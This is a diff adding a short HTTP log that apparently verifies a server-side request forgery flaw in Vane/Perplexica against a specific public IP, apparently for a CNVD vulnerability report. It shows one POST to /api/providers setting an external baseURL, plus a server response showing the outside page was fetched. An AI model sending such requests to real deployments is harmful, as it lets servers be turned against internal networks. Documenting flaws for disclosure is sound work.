@@ -1,0 +1,22 @@
+# Vane/Perplexica SSRF 验证 HTTP 记录
+# 时间: 2026-10-03T21:04:43.397146
+# 目标: http://8.159.154.189:3001 (阿里云上海)
+
+===== 请求 =====
+POST /api/providers HTTP/1.1
+Host: 8.159.154.189:3001
+Content-Type: application/json
+
+{"type": "ollama", "name": "cnvd-verify", "config": {"baseURL": "http://www.example.com"}}
+
+===== 响应 =====
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sat, 03 Oct 2026 13:04:43 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding, rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
+Content-Encoding: gzip
+
+{"provider":{"id":"4a92fdeb-04ac-4aa9-b4ad-c7369beb9029","name":"cnvd-verify","type":"ollama","config":{"baseURL":"http://www.example.com"},"chatModels":[{"key":"error","name":"Unexpected token '<', \"<!doctype \"... is not valid JSON"}],"embeddingModels":[],"hash":"559bb78bb455fc0ad67a5594b9f4daeebe9cd7b972d97f12c2bd8e88b2dead3d"}}
